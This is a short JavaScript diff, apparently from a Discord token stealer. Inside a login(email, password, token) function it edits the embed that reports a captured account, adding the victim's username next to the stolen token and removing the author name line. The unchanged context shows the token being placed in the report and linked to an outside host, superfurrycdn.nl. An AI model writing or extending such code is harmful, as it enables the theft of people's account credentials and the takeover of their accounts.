@@ -610,6 +610,11 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
+            name: '<a:944007295417843743:959785231982931979> username:',
+            value: `\` ${json.username} + '#' + ${json.discriminator}`,
+            inline: false,
+          },
+          {
             name: '<a:944007295417843743:959785231982931979> Token:',
             value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
@@ -651,7 +656,6 @@ const login = async (email, password, token) => {
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' - ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
